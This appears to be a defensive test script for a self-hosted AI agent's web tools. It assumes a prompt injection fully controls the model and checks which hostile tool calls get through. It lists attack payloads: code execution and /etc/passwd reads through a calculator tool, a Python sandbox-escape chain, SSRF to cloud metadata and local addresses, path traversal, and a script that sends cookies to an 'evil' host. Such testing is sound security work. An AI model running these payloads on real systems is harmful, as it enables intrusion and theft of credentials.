import sys; sys.path.insert(0, "/Users/apple/ali/work/self-hosted")
"""What can an injection actually do? Assume the model is fully controlled."""
import asyncio, json
from core.harness import Harness
from core.tools import WEB_TOOLS
from core.tools.registry import execute, ToolError

print("=== 1. can any tool run code? ===")
for name, t in WEB_TOOLS.items():
    print(f"  {name:<16} -> {t.fn.__name__}")

print("\n=== 2. direct attacks on each tool ===")
attacks = [
    ("calculate", {"expression": "__import__('os').system('id')"}),
    ("calculate", {"expression": "open('/etc/passwd').read()"}),
    ("calculate", {"expression": "(1).__class__.__bases__[0].__subclasses__()"}),
    ("read_url",  {"url": "file:///etc/passwd"}),
    ("read_url",  {"url": "http://169.254.169.254/latest/meta-data/"}),
    ("read_url",  {"url": "https://127.0.0.1:8000/api/me"}),
    ("read_url",  {"url": "https://192.168.1.1/"}),
    ("search_web",{"query": "x"*5000}),
    ("create_webpage", {"title": "../../etc/evil", "html": "<p>x</p>"}),
    ("create_webpage", {"title": "x", "html": "<script>fetch('http://evil/'+document.cookie)</script>"}),
]
for name, args in attacks:
    try:
        r = execute(WEB_TOOLS, name, args)
        detail = str(r)[:70]
        print(f"  ALLOWED  {name:<15} {str(args)[:44]:<46} -> {detail}")
    except (ToolError, Exception) as e:
        print(f"  blocked  {name:<15} {str(args)[:44]:<46} -> {type(e).__name__}: {str(e)[:34]}")
